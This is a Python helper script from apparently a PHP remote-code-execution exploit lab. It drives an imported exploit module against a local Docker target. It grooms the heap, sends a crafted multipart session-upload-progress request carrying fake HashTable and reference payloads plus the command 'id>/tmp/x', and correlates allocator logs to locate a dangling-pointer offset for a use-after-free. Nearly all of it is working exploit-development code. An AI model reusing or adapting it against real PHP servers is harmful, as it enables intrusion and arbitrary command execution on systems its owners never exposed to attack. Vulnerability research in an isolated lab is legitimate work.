#!/usr/bin/env python3
"""diag_findA.py — locate PS(http_session_vars)'s dangling array offset by cross-correlating
alloc->free (arming) with 32B _live_ref reallocs (exploit). Run in the WORKING env first."""
import argparse, subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402  (chunked-TE + big-_big overrides)

CHUNK = 0x7ffffe000000
ap = argparse.ArgumentParser()
ap.add_argument("--url", default="http://localhost:18111/index.php")
ap.add_argument("--container", default="p2s-alv")
a = ap.parse_args()

t = alv.Target(a.url, timeout=150)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=0x7e0d8, huge_mb=140)

def clear_log():
    subprocess.run(["docker", "exec", a.container, "sh", "-c", ": > /tmp/alloc_all.log 2>/dev/null || touch /tmp/alloc_all.log"])
def read_log():
    return subprocess.run(["docker", "exec", a.container, "cat", "/tmp/alloc_all.log"], capture_output=True).stdout.decode("latin1").splitlines()

def parse(lines):
    allocs = {}; frees = []; seq = 0
    for ln in lines:
        p = ln.split()
        if not p: continue
        try:
            if p[0] == "M" and len(p) >= 3:
                size, addr = int(p[1]), int(p[2], 16); allocs[addr] = (seq, size); seq += 1
            elif p[0] == "R" and len(p) >= 4:
                size, naddr = int(p[2]), int(p[3], 16); allocs[naddr] = (seq, size); seq += 1
            elif p[0] == "F" and len(p) >= 2:
                frees.append((seq, int(p[1], 16))); seq += 1
        except ValueError:
            pass
    return allocs, frees

# ---- Phase 1: arming (rotate + _oom_arm_pads), exactly as stage3_nb ----
clear_log(); time.sleep(0.3)
ex.rotate()
ex._oom_arm_pads()
time.sleep(0.6)
p1 = read_log()
allocs, frees = parse(p1)
print(f"[{a.container}] arming log lines={len(p1)}  allocs={len(allocs)} frees={len(frees)}")

# dangling candidates: main-chunk alloc of HashTable-ish size (>=96B) that was later freed
freed_addrs = {addr for _, addr in frees}
cand = {}
for addr, (sq, sz) in allocs.items():
    off = addr - CHUNK
    if 0 <= off < (1 << 21) and sz >= 96 and addr in freed_addrs:
        cand[off] = sz
print(f"dangling candidates (main-chunk, size>=96, freed after arming): {len(cand)}")

# ---- Phase 2: exploit request; collect 32B alloc offsets (_live_ref / small value buffers) ----
clear_log(); time.sleep(0.3)
ht = ex._fake_ht(0x7e0d8); live = ex._live_ref(0x7e0d8)
parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
parts.append({"name": (f"a{0:030d}")[:31], "data": ht})
resp = t.post(alv.multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)
time.sleep(0.6)
p2 = read_log()
a2, _ = parse(p2)
live_offsets = {addr - CHUNK for addr in a2 if (addr - CHUNK) >= 0 and (addr - CHUNK) < (1 << 21)}
print(f"exploit log lines={len(p2)}  main-chunk alloc offsets={len(live_offsets)}")

# intersection: dangling candidate that ALSO got an exploit-request allocation at same offset
hit = sorted(set(cand) & live_offsets)
print(f"\nINTERSECTION (dangling AND reallocated during exploit): {len(hit)}")
for off in hit[:60]:
    print(f"   off=0x{off:x}  arming_size={cand[off]}")
